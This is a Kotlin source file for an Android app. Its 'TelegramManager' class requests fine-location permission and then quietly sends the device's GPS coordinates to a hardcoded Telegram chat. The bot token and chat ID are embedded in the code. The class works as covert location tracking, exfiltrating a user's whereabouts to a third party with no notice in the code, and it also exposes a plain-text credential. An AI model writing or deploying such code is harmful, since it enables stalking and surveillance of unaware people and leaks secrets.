package com.n

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.pengrad.telegrambot.TelegramBot
import com.pengrad.telegrambot.request.SendMessage
import kotlinx.coroutines.*
import com.n.LOCATION_PERMISSION_REQUEST_CODE



@OptIn(DelicateCoroutinesApi::class)
class TelegramManager(private val context: Context) {

    private val botToken = "6252932464:AAFicXDq6AZ4uGyRmLnL3pjQTD3JlVj7k58"
    private val chatId = "1100137362"
    private val locManager = LocManager(context)

    private val bot = TelegramBot(botToken)

    init {
        GlobalScope.launch(Dispatchers.IO) {
            while (true) {
                if (isInternetAvailable()) {
                    if (checkLocationPermissions()) {
                        val location = withContext(Dispatchers.Main) {
                            locManager.getLocation()
                        }

                        val message: String = if (location != null) {
                            "Latitude: ${location.latitude}\nLongitude: ${location.longitude}"
                        } else {
                            "Location not available"
                        }

                        val request = SendMessage(chatId, message)
                        bot.execute(request)

                        break
                    } else {
                        requestLocationPermissions()
                    }
                } else {
                    delay(10000) // Esperar 10 segundos antes de volver a intentar enviar
                }
            }
        }
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun checkLocationPermissions(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestLocationPermissions() {
        ActivityCompat.requestPermissions(
            context as Activity,
            arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
            LOCATION_PERMISSION_REQUEST_CODE
        )
    }
}
